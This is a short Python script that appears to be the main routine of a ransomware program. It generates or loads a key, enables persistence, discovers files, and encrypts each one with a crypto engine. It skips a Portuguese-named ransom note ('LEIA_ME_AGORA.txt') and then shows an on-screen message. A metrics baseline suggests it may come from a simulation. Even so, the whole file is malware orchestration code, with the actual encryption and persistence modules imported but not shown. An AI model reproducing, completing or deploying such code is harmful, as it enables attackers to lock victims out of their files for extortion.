import time
import sys
import target_discovery
import crypto_engine
import persistence
import metrics
import gui_interface 

def start_attack():
    key = crypto_engine.load_or_generate_key()
    persistence.enable_persistence()
    
    targets = target_discovery.discover_files()
    if not targets:
        return

    start_time = time.time()
    metrics.save_baseline(targets)
    
    for file_path in targets:
        if "LEIA_ME_AGORA.txt" in file_path: continue
        crypto_engine.encrypt_file(file_path, key)

    duration = time.time() - start_time

    gui_interface.show_screen(duration)

if __name__ == "__main__":
    start_attack()